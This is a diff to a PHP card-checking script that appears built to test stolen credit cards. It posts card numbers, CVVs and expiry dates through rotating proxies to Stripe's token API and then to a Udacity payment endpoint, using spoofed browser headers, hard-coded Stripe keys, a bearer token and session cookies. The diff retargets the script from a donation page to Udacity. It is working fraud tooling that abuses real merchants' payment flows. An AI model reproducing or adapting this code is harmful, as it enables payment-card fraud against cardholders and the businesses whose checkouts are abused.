@@ -115,20 +115,19 @@ echo '[ IP: '.$ip.' ] ';
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://michelf.ca/processus/co2.php?lang=en');
+curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
 curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-  'authority: michelf.ca',
+  'authority: api.stripe.com',
   'method: POST',
-  'path: /processus/co2.php',
+  'path: /v1/tokens',
   'scheme: https',
   'accept: application/json',
   'accept-language: en-US,en;q=0.5',
-  'content-type: application/json',
-  'Cookie: __stripe_sid=0f73d25a-75d7-4cb2-9e06-6d52784c215dc492be; __stripe_mid=ad03831d-3525-46e7-92b6-df6a84c760710eb964',
-  'origin: https://michelf.ca',
-  'referer: https://michelf.ca/donate/',
+  'content-type: application/x-www-form-urlencoded',
+  'origin: https://js.stripe.com',
+  'referer: https://js.stripe.com/',
   'sec-fetch-dest: empty',
   'sec-fetch-mode: cors',
   'sec-fetch-site: same-site',
@@ -143,7 +142,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"currency":"USD","items":[],"subtotal":0,"tax":[],"total":500,"donation":500,"pmeth":"cc","billing":{"name":"'.$name.'+'.$last.'","email":"'.$email.'","company":"","address1":"","address2":"","city":"","zip":"","country":"US","state":"US-NY"},"message":"","tz-offset":-360,"invoice_no":null}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[name]='.$name.'+'.$last.'&card[address_zip]='.$zip.'&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=3b66fe57-b81e-44b6-b105-89417b526ef56a02ea&muid=c7750d0a-158c-4138-86df-1562336d635fb51684&sid=c640436e-e9a7-40e6-b4ae-d4c487974f1d31c10f&payment_user_agent=stripe.js%2F10dd13b87%3B+stripe-js-v3%2F10dd13b87&time_on_page=43647&key=pk_live_4ubp5nwZfwTgHyToeeygtLYh&pasted_fields=number');
 
 
 
@@ -155,7 +154,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
+curl_setopt($ch, CURLOPT_URL, 'https://payment.udacity.com/api/braavos/users/df5eacac-a8b8-11ec-b8fd-83bff04c2825/payment_methods');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -166,15 +165,17 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: api.stripe.com',
+'authority: payment.udacity.com',
 'method: POST',
-'path: /v1/tokens',
+'path: /api/braavos/users/df5eacac-a8b8-11ec-b8fd-83bff04c2825/payment_methods',
 'scheme: https',
 'accept: application/json',
 'accept-language: en-US,en;q=0.5',
 'content-type: application/x-www-form-urlencoded',
-'origin: https://js.stripe.com',
-'referer: https://js.stripe.com/',
+'authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTA0MTkyNTEsImlhdCI6MTY0NzgyNzI1MSwia2lkIjoiMTAwMCIsInVpZCI6ImRmNWVhY2FjLWE4YjgtMTFlYy1iOGZkLTgzYmZmMDRjMjgyNSIsImRvbSI6IlVTIn0.kFwpqAamL8ku05cwN7NxGIUINceKCJdjyXB090lIAwIWpwI_OOAY9EXyjBFjrVopV2idQzOT4NMBkMeqlSp1huZhe0R6mMxu4TxMzPReLmZOppFuTRjYcM3Zt1Jx4Tkz9aSZ_QxtXd8uwA9YDJCoqWSWgIM8bMAdKeQqsHjUbSANfyWLoG6OUvxB7UqSz5fzbdS_NKa1hrJVg8G5QtGA9CKgYGdb-lWNu_v5F56dzem7rJjJNYdrmdDsNOIMlsnHGABYQHM8WqfZJaHyDGVrOqcBdJsEQ6ydZfRYMZb1tNMm893V1-yp5tYQc0rjSTefhJYq8UQKM_sqriqo0QKuCA',
+'Cookie: __cf_bm=q_TJl4NiupHwZHofEs8mdf3M.x3sEY18N.G7EbzmTPQ-1647827217-0-AZsK0xRU6vYJKjKUyvL/tZG4y8fQ8Fl3Cdrbs/XDeH7ylsvjnNI30pXhM5ybZNzE784VfM4iqfWwyxCibR2S8UZnrG8Z2RougX+TPZ2hitpQ; _jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NTA0MTkyNTEsImlhdCI6MTY0NzgyNzI1MSwia2lkIjoiMTAwMCIsInVpZCI6ImRmNWVhY2FjLWE4YjgtMTFlYy1iOGZkLTgzYmZmMDRjMjgyNSIsImRvbSI6IlVTIn0.kFwpqAamL8ku05cwN7NxGIUINceKCJdjyXB090lIAwIWpwI_OOAY9EXyjBFjrVopV2idQzOT4NMBkMeqlSp1huZhe0R6mMxu4TxMzPReLmZOppFuTRjYcM3Zt1Jx4Tkz9aSZ_QxtXd8uwA9YDJCoqWSWgIM8bMAdKeQqsHjUbSANfyWLoG6OUvxB7UqSz5fzbdS_NKa1hrJVg8G5QtGA9CKgYGdb-lWNu_v5F56dzem7rJjJNYdrmdDsNOIMlsnHGABYQHM8WqfZJaHyDGVrOqcBdJsEQ6ydZfRYMZb1tNMm893V1-yp5tYQc0rjSTefhJYq8UQKM_sqriqo0QKuCA; ajs_anonymous_id="79c3b42d-9cfe-4038-842d-d330deef0abe"; ajs_created_at=1647827269174; viewer_region=C; viewer_in_EU=false; viewer_country=BD; dismissed_personalized-discount-3_autopop_modal=true; __stripe_mid=c7750d0a-158c-4138-86df-1562336d635fb51684; __stripe_sid=c640436e-e9a7-40e6-b4ae-d4c487974f1d31c10f',
+'origin: https://payment.udacity.com',
+'referer: https://payment.udacity.com/subscribe/21848270?&payment_plan=recurring',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-site',
@@ -183,7 +184,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 ));
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'time_on_page=61965&pasted_fields=number&guid='.$guid.'&muid='.$muid.'&sid='.$sid.'&key=pk_live_40NCEKUf6u3XJpkF8zHm0rI1PchkWAS0Z1E7ygiVurV1V6P5yiJlHFtA6pfC93nhRWXwY9Bx1350DRlIGNXHKLpuG0040r5a1LY&payment_user_agent=stripe.js%2F78ef418&card[name]='.$name.'+'.$last.'&card[address_state]=NY&card[address_country]=US&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"provider":"stripe","data":{},"card_token":"'.$id.'"}');
 
 
 $result2 = curl_exec($ch);
